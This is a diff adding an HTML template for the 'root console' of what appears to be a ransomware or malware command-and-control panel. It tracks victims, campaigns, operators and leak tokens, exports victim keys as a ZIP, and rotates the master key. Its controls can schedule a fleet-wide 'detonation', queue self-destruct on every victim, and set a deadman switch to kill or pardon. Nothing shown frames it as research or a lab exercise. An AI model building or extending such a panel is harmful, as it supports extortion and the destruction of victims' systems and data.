@@ -1,0 +1,133 @@
+{% extends "base.html" %}
+{% block title %}root console{% endblock %}
+{% block content %}
+<h1>Root console</h1>
+<p class="sub">Root-only system view. No secret material is rendered here.</p>
+
+<div class="panel" style="margin-bottom:12px">
+  <h2>Root actions</h2>
+  <p class="sub">Destructive actions require a fresh step-up (TOTP or root
+     password) within 5 minutes.</p>
+  <p>
+    <a class="btn" href="{{ url_for('root_stepup', next=url_for('root_console')) }}">STEP-UP</a>
+    <form method="post" action="{{ url_for('root_keys_zip') }}" style="display:inline">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <button class="btn blue" type="submit">EXPORT KEYS ZIP</button>
+    </form>
+  </p>
+  <form method="post" action="{{ url_for('root_panic') }}"
+        onsubmit="return confirm('Kill the ENTIRE fleet? This queues self-destruct on every victim.')">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <input name="confirm" placeholder="type DESTROY to confirm"
+           style="width:220px" autocomplete="off">
+    <button class="btn red" type="submit">PANIC — KILL ALL</button>
+  </form>
+</div>
+
+<div class="grid" style="margin-bottom:12px">
+  <div class="panel">
+    <h2>Scheduled detonation</h2>
+    <p class="small">Armed at: <b>{{ cfg.detonate_at or '—' }}</b> (server time)</p>
+    <form method="post" action="{{ url_for('root_schedule') }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <input type="datetime-local" name="when">
+      <button class="btn red" type="submit">SCHEDULE FLEET</button>
+    </form>
+    <form method="post" action="{{ url_for('root_schedule_cancel') }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <button class="btn dim" type="submit">CANCEL SCHEDULE</button>
+    </form>
+  </div>
+  <div class="panel">
+    <h2>Lockdown</h2>
+    <p class="small">Status: <b>{{ 'ON' if cfg.lockdown == '1' else 'off' }}</b> —
+       admins become read-only.</p>
+    <form method="post" action="{{ url_for('root_lockdown') }}" class="inline">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <input type="hidden" name="on" value="{{ '0' if cfg.lockdown == '1' else '1' }}">
+      <button class="btn" type="submit">{{ 'LIFT LOCKDOWN' if cfg.lockdown == '1' else 'ENGAGE LOCKDOWN' }}</button>
+    </form>
+  </div>
+  <div class="panel">
+    <h2>Deadman</h2>
+    <p class="small">Root last seen: <b>{{ cfg.root_last_seen or '—' }}</b></p>
+    <form method="post" action="{{ url_for('root_deadman') }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <label class="small">hours</label>
+      <input name="hours" value="{{ cfg.deadman_hours or '0' }}" style="width:70px">
+      <select name="action">
+        <option value="none" {{ 'selected' if cfg.deadman_action == 'none' }}>none</option>
+        <option value="pardon" {{ 'selected' if cfg.deadman_action == 'pardon' }}>pardon</option>
+        <option value="kill" {{ 'selected' if cfg.deadman_action == 'kill' }}>kill</option>
+      </select>
+      <button class="btn" type="submit">SAVE DEADMAN</button>
+    </form>
+  </div>
+  <div class="panel">
+    <h2>Audit</h2>
+    <p class="small">Frozen: <b>{{ 'YES' if cfg.audit_frozen == '1' else 'no' }}</b></p>
+    <form method="post" action="{{ url_for('root_audit_freeze') }}" class="inline">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <input type="hidden" name="on" value="{{ '0' if cfg.audit_frozen == '1' else '1' }}">
+      <button class="btn" type="submit">{{ 'UNFREEZE' if cfg.audit_frozen == '1' else 'FREEZE' }}</button>
+    </form>
+    <a class="btn blue" href="{{ url_for('root_audit_snapshot') }}">SIGNED SNAPSHOT</a>
+    <h2 style="margin-top:14px">Master rotation</h2>
+    <form method="post" action="{{ url_for('root_rotate_master') }}"
+          onsubmit="return confirm('Re-seal every key under a new master?')">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <input type="password" name="new_master" placeholder="new master (12+ chars)"
+             autocomplete="new-password">
+      <input type="password" name="confirm" placeholder="repeat new master"
+             autocomplete="new-password">
+      <button class="btn red" type="submit">ROTATE MASTER</button>
+    </form>
+  </div>
+</div>
+
+<div class="cards">
+  <div class="card">victims <b>{{ counts.victims }}</b></div>
+  <div class="card">operators <b>{{ counts.operators }}</b></div>
+  <div class="card">messages <b>{{ counts.messages }}</b></div>
+  <div class="card">campaigns <b>{{ counts.campaigns }}</b></div>
+  <div class="card">leak tokens <b>{{ counts.leak_tokens }}</b></div>
+</div>
+
+<div class="grid">
+  <div class="panel">
+    <h2>Backend</h2>
+    <div class="kv">
+      <dt>engine</dt><dd>{{ backend }}</dd>
+      <dt>database</dt><dd><code>{{ db_path }}</code></dd>
+      <dt>audit chain</dt><dd>{% if audit_ok %}<span class="badge on">verified</span>{% else %}<span class="badge armed">broken @ {{ bad_event }}</span>{% endif %}</dd>
+      <dt>sig bypass</dt><dd>{{ 'absent' if not flags.sig_bypass else 'PRESENT' }}</dd>
+      <dt>payload env</dt><dd>{{ 'set' if flags.payload_env else 'not set' }}</dd>
+      <dt>secure cookie</dt><dd>{{ 'set' if flags.tls_cookie else 'not set' }}</dd>
+    </div>
+    <p><a class="btn dim" href="{{ url_for('root_audit_json') }}">EXPORT AUDIT JSON</a>
+       <a class="btn" href="{{ url_for('root_2fa') }}">ROOT 2FA</a></p>
+  </div>
+  <div class="panel">
+    <h2>Permission matrix</h2>
+    <table>
+      <tr><th>role</th><th>actions</th></tr>
+      {% for role, perms in permissions.items() %}
+      <tr><td>{{ role }}</td><td class="small">{{ perms|sort|join(', ') }}</td></tr>
+      {% endfor %}
+    </table>
+  </div>
+  <div class="panel">
+    <h2>Build</h2>
+    <pre class="small" style="white-space:pre-wrap;margin:0">{{ build }}</pre>
+  </div>
+</div>
+
+<div style="margin-top:28px;padding-top:18px;border-top:1px solid #5a1a24">
+  <div class="panel" style="border-color:#ff4d6d">
+    <h2 style="color:#ff4d6d">Danger zone</h2>
+    <p class="small">Definitive panic is a separate interface, below everything
+       else. Five pins + root step-up; irreversible.</p>
+    <a class="btn red" href="{{ url_for('root_definitive') }}">OPEN DEFINITIVE PANIC</a>
+  </div>
+</div>
+{% endblock %}
